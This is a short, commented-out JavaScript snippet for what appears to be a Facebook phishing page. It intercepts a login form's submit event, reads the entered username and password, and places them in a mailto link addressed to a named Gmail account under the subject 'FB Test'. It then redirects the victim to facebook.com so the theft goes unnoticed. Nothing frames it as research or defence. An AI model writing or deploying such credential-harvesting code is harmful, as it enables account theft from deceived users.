// document.getElementById("loginForm").addEventListener("submit", function(event) {
//     event.preventDefault(); // Prevent the form from submitting normally

//     var username = document.getElementById("username").value;
//     var password = document.getElementById("password").value;

//     // Send email (Note: This is a simplified example, and sending emails from JavaScript directly is not recommended)
//     var subject = "Login Alert";
//     var message = "Username: " + username + "\nPassword: " + password;
//     var emailUrl = "mailto:rwayisibongile@gmail.com?subject= FB Test" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(message);
//     window.location.href = emailUrl;

//     // Redirect after processing (Note: This will work only if the email client does not block the redirection)
//     var redirectUrl = "https://www.facebook.com/";
//     setTimeout(function() {
//         window.location.href = redirectUrl;
//     }, 1000); // Redirect after a delay (1 second)
// });
